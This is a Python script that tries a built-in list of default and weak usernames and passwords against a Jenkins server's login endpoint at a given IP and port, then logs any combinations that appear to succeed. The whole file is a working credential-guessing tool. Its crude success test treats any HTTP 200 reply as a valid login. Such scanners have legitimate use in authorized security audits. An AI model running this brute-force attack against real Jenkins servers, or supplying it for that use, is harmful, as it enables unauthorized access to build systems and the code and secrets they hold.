#encoding:utf-8
try:
    import os,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
    import requests
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

is_true = False
user_passwd = []
def check(ip,port):
    global is_true,user_passwd
    url = "http://"+ip+":"+str(port) + "/j_acegi_security_check"
    users = ["admin","root","user","jenkins"]
    passwds = ["admin","root","toor","test","123456","jenkins","user"]
    for user in users:
        for passwd in passwds:
            data = {
                        "j_username" : user,
                        "j_password" : passwd,
                        "from" : "/asynchPeople/",
                        "Submit" : "Sign in"
                        }
            try:
                response = requests.post(url , data=data,timeout=2)
                # print(response.status_code)
                if response.status_code == 200:
                    is_true = True
                    user_passwd.append({user:passwd})

            except Exception as e:
                print(e)
                pass
    if is_true == True:
        logging.info("[+] {} find jenkins weak passwd use , user_passwd : {}".format(ip,user_passwd))
        os._exit(1)
    else:
        logging.info("[-] {} do not found jenkins weak password".format(ip))
        os._exit(2)

def main(ip,port):
    check(ip,port)
if __name__ == "__main__":
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,int(port))
